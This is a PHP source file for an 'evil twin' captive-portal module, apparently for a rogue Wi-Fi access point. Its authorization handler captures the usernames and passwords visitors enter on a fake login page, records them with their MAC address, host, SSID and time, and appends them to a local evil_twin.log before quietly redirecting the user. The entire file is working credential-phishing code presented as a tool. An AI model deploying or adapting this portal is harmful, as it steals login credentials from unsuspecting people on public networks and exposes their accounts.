<?php namespace evilportal;

class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        // this is where your form data gets submitted to
        if (isset($this->request->username) && isset($this->request->password))
        {
            $parameters = array(
                'username' => strtolower(trim($this->request->username)),
                'password' => $this->request->password,
                'mac' => isset($this->request->mac) ? strtolower(trim($this->request->mac)) : '',
                'host' => isset($this->request->host) ? strtolower(trim($this->request->host)) : '',
                'ssid' => isset($this->request->ssid) ? strtolower(trim($this->request->ssid)) : '',
                'datetime' => date('Y-m-d H:i:s', time())
            );

            // each input should have no more that 50 characters
            // basic flood protection
            mb_internal_encoding('UTF-8');
            if (mb_strlen($parameters['username']) >= 1 && mb_strlen($parameters['username']) <= 50 && mb_strlen($parameters['password']) >= 1 && mb_strlen($parameters['password']) <= 50)
            {
                if (mb_strlen($parameters['mac']) > 50)
                {
                    $parameters['mac'] = substr($parameters['mac'], 0, 50);
                }
                if (mb_strlen($parameters['host']) > 50)
                {
                    $parameters['host'] = substr($parameters['host'], 0, 50);
                }
                if (mb_strlen($parameters['ssid']) > 50)
                {
                    $parameters['ssid'] = substr($parameters['ssid'], 0, 50);
                }

                // write JSON string to a file
                $string = json_encode($parameters) . "\n";
                if (file_exists('/sd/portals/evil-twin/'))
                {
                    // write to an SD card storage as first option
                    if (!file_exists('/sd/logs/'))
                    {
                        mkdir('/sd/logs/');
                    }
                    file_put_contents('/sd/logs/evil_twin.log', $string, FILE_APPEND | LOCK_EX);
                }
                else if (file_exists('/root/portals/evil-twin/'))
                {
                    // write to an internal storage as second option
                    if (!file_exists('/root/logs/'))
                    {
                        mkdir('/root/logs/');
                    }
                    file_put_contents('/root/logs/evil_twin.log', $string, FILE_APPEND | LOCK_EX);
                }
            }
        }

        // call parent to handle basic authorization first
        // this is where and when the user redirection is taking place
        parent::handleAuthorization();
    }

    /**
     * Override this to do something when the client is successfully authorized.
     * By default it just notifies the Web UI.
     */
    public function onSuccess()
    {
        // calls default success message
        parent::onSuccess();
    }

    /**
     * If an error occurs then do something here.
     * Override to provide your own functionality.
     */
    public function showError()
    {
        // calls default error message
        parent::showError();
    }
}
?>
